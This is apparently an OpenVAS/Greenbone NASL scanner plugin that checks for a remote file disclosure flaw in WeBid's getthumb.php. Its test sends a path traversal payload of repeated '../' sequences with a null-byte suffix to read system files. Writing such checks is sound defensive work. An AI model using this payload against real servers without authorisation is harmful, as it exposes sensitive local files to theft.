CPE = "cpe:/a:webidsupport:webid";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103542" );
	script_bugtraq_id( 55080 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_name( "WeBid 'getthumb.php' Remote File Disclosure Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55080" );
	script_xref( name: "URL", value: "http://www.webidsupport.com/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-08-18 14:06:33 +0200 (Sat, 18 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_webid_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "webid/installed" );
	script_tag( name: "summary", value: "WeBid is prone to a remote file-disclosure vulnerability because it
fails to adequately validate user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this vulnerability would allow an attacker to obtain
potentially sensitive information from local files on computers
running the vulnerable application. This may aid in further attacks." );
	script_tag( name: "affected", value: "WeBid 1.0.4 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/getthumb.php?fromfile=getthumb.php&w=" + crap( data: "../", length: 6 * 9 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

